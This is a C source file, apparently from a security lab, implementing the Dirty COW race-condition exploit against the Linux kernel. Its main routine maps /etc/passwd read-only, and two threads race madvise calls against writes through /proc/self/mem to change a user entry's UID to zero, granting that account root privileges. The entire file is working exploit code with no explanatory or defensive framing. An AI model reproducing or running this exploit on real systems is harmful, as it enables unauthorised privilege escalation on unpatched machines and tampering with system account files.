#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>

void *map;
void *writeThread(void *arg);
void *madviseThread(void *arg);

int main(int argc, char *argv[])
{
        pthread_t pth1,pth2;
        struct stat st;
        int file_size;

        // Open the target file in the read-only mode.
        int f=open("/etc/passwd", O_RDONLY);

        // Map the file to COW memory using MAP_PRIVATE.
        fstat(f, &st);
        file_size = st.st_size;
        map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

        // Find the position of the target area
        char *position = strstr(map, "test:x:1001");
        off_t * offset = position - (char*) map;

        // We have to do the attack using two threads.
        pthread_create(&pth1, NULL, madviseThread, (void  *)file_size);
        pthread_create(&pth2, NULL, writeThread, offset);

        // Wait for the threads to finish.
        pthread_join(pth1, NULL);
        pthread_join(pth2, NULL);
        return 0;
}

void *writeThread(void *arg)
{
        char *content= "test:x:0000";
        off_t offset = (off_t) arg;
        printf("distance : %d\n", offset);
        int f=open("/proc/self/mem", O_RDWR);
        printf("writeThread executing...\n");
        while(1) {
                // Move the file pointer to the corresponding position.
                lseek(f, (uintptr_t) map + offset, SEEK_SET);
                // Write to the memory.
                write(f, content, strlen(content));
        }
}

void *madviseThread(void *arg)
{
        int file_size = (int) arg;
        printf("madviseThread executing...\n");
        while(1){
                madvise(map, file_size, MADV_DONTNEED);
        }
}